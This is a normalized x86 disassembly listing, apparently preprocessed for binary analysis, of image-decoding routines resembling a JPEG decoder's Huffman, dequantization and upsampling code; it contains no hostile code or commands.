mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x140 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4245b0
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x2c ]
mov [ edx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x28 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x10 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x18 ] 0x1
jge r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
sar eax cl
and eax 0x1
test eax eax
je r-xdata
push 0x1
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov dx [ ecx ]
or dx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov [ eax ] dx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x18 ] ecx
xor al al
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_424b60
push ebp
mov ebp esp
sub esp 0x198
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x170 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx 0x1
mov ecx [ ecx + 0x178 ]
shl edx cl
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
or edx 0xffffffff
mov ecx [ eax + 0x178 ]
shl edx cl
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xfc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x34 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ecx ]
mov [ ebp - 0x44 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x3c ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x4c ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16c ]
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4245b0
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x20 ] 0x0
jbe r-xdata
jmp r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x44 ]
mov [ eax ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x40 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
mov [ edx + 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x30 ]
mov [ ecx + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x14 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x8 ]
jg r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x8 ]
jg r-xdata
cmp [ ebp - 0x30 ] 0x8
jge r-xdata
mov ecx [ ebp - 0x20 ]
sub ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ edx * 4 + r--data ]
mov ecx [ ebp - 0x24 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x28 ]
movsx ecx [ eax ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx 0x8
mov edx [ ebp - 0x2c ]
sar edx cl
and edx 0xff
mov [ ebp - 0x154 ] edx
mov eax [ ebp - 0x154 ]
mov ecx [ ebp - 0x48 ]
mov edx [ ecx + eax * 4 + 0x90 ]
mov [ ebp - 0x150 ] edx
cmp [ ebp - 0x150 ] 0x0
je r-xdata
push 0x0
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x1
jge r-xdata
mov [ ebp - 0x150 ] 0x9
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x150 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x48 ]
add ecx [ ebp - 0x154 ]
xor edx edx
mov dl [ ecx + 0x490 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x8
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x30 ]
sub ecx 0x1
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x30 ]
sar edx cl
and edx 0x1
test edx edx
je r-xdata
push 0x1
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
sar ecx 0x4
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x14 ]
and edx 0xf
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x150 ] 0x1
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
movsx ecx [ eax ]
and ecx [ ebp - 0xc ]
test ecx ecx
jne r-xdata
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0xf
je r-xdata
cmp [ ebp - 0x14 ] 0x1
je r-xdata
mov eax [ ebp - 0x150 ]
push eax
mov ecx [ ebp - 0x48 ]
push ecx
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_423340
add esp 0x14
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
xor al al
mov edx [ ebp - 0x4c ]
sub edx 0x1
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x4c ]
mov ecx [ ebp + eax * 4 - 0x14c ]
mov edx [ ebp - 0x24 ]
mov [ edx + ecx * 2 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x28 ]
movsx eax [ edx ]
test eax eax
jl r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ edx * 4 + r--data ]
mov ecx [ ebp - 0x24 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x28 ]
movsx ecx [ eax ]
test ecx ecx
je r-xdata
mov edx 0x1
mov ecx [ ebp - 0x1c ]
shl edx cl
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x76
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
mov ecx [ ebp - 0x28 ]
mov dx [ ecx ]
add dx [ ebp - 0x10 ]
mov eax [ ebp - 0x28 ]
mov [ eax ] dx
mov ecx [ ebp - 0x28 ]
mov dx [ ecx ]
add dx [ ebp - 0xc ]
mov eax [ ebp - 0x28 ]
mov [ eax ] dx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x30 ] 0x1
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x1c ]
jge r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx 0x1
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x30 ]
sar edx cl
and edx 0x1
test edx edx
je r-xdata
push 0x1
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
jmp r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx 0x1
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x30 ]
sar edx cl
and edx 0x1
test edx edx
je r-xdata
push 0x1
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x1c ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x30 ]
sar edx cl
mov eax 0x1
mov ecx [ ebp - 0x1c ]
shl eax cl
sub eax 0x1
and edx eax
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
movsx ecx [ eax ]
and ecx [ ebp - 0xc ]
test ecx ecx
jne r-xdata
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ecx * 4 + r--data ]
mov [ ebp - 0x158 ] edx
mov eax [ ebp - 0x158 ]
mov ecx [ ebp - 0x24 ]
mov dx [ ebp - 0x14 ]
mov [ ecx + eax * 2 ] dx
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x158 ]
mov [ ebp + eax * 4 - 0x14c ] ecx
mov edx [ ebp - 0x4c ]
add edx 0x1
mov [ ebp - 0x4c ] edx
mov edx [ ebp - 0x28 ]
movsx eax [ edx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x28 ]
mov dx [ ecx ]
add dx [ ebp - 0x10 ]
mov eax [ ebp - 0x28 ]
mov [ eax ] dx
mov ecx [ ebp - 0x28 ]
mov dx [ ecx ]
add dx [ ebp - 0xc ]
mov eax [ ebp - 0x28 ]
mov [ eax ] dx
jmp r-xdata
sub_4250d0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push 0x54
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x19c ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_425180
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x24 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x50 ] eax
push 0x100
push 0x0
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x50 ]
push eax
call memset
add esp 0xc
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2c ] 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x54
mov [ ebp - 0xc ] eax
sub_425180
push ebp
mov ebp esp
sub esp 0x80
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x19c ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x24 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x34 ]
sub ecx 0x1
mov [ ebp - 0x34 ] ecx
cmp [ ebp - 0x34 ] 0x7
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x7
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x24 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov edx [ ebp - 0x34 ]
jmp [ edx * 4 + jump_table_425470 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x2c ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x18 ] sub_42cf10
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov [ ebp - 0x18 ] sub_42cc40
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov [ ebp - 0x18 ] sub_42c7c0
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x38 ] ecx
cmp [ ebp - 0x38 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x54
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov [ edx + ecx * 4 + 0x4 ] eax
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx + 0x30 ]
test edx edx
je r-xdata
mov [ ebp - 0x18 ] sub_42bff0
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + edx * 4 + 0x2c ] ecx
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x3c ] edx
cmp [ ebp - 0x3c ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] sub_42b980
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
cmp [ ebp - 0x38 ] 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x50 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0x3c ] 0x1
je r-xdata
mov [ ebp - 0x18 ] sub_42b370
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] 0x40
jge r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x50 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0x3c ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x30
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x1c ]
xor edx edx
mov dx [ ecx + eax * 2 ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x20 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
cmp [ ebp - 0xc ] 0x40
jge r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x50 ]
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x1c ]
xor ecx ecx
mov cx [ eax + edx * 2 ]
mov edx [ ebp - 0xc ]
movsx eax [ edx * 2 + r--data ]
imul ecx eax
add ecx 0x800
sar ecx 0xc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x24 ]
mov [ eax + edx * 4 ] ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0x8
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x30
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov [ ebp - 0x30 ] 0x0
jmp r-xdata
cmp [ ebp - 0x30 ] 0x8
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x1c ]
xor ecx ecx
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x40 ] ecx
fild [ ebp - 0x40 ]
mov edx [ ebp - 0x2c ]
fmul [ edx * 8 + r--data ]
mov eax [ ebp - 0x30 ]
fmul [ eax * 8 + r--data ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x28 ]
fstp [ edx + ecx * 4 ]
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x1
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x30 ]
add ecx 0x1
mov [ ebp - 0x30 ] ecx
sub_425490
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x1c
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18c ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_425580
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x4a ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x114 ]
mov [ ecx + 0x10 ] eax
mov ecx [ ebp + 0xc ]
and ecx 0xff
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x5c ]
imul ecx [ eax + 0x64 ]
push ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x8 ]
add esp 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
push ecx
call sub_420c90
add esp 0x8
push eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x5c ]
imul ecx [ eax + 0x64 ]
push ecx
push 0x0
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x10 ]
add esp 0x18
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub_425580
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x4a ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x8 ] 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a0 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_4256b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x3
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
push 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x1c ]
add esp 0x14
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_425870
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_425760
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
sub_4256b0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x20 ]
sub eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x10 ]
jbe r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1a0 ]
call [ edx + 0x4 ]
add esp 0x1c
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ ebp + 0x18 ]
lea ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1a8 ]
call [ eax + 0x4 ]
add esp 0x10
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
add edx [ ebp - 0x8 ]
mov eax [ ebp + 0x1c ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0xc ] ecx
sub_425760
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x18
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
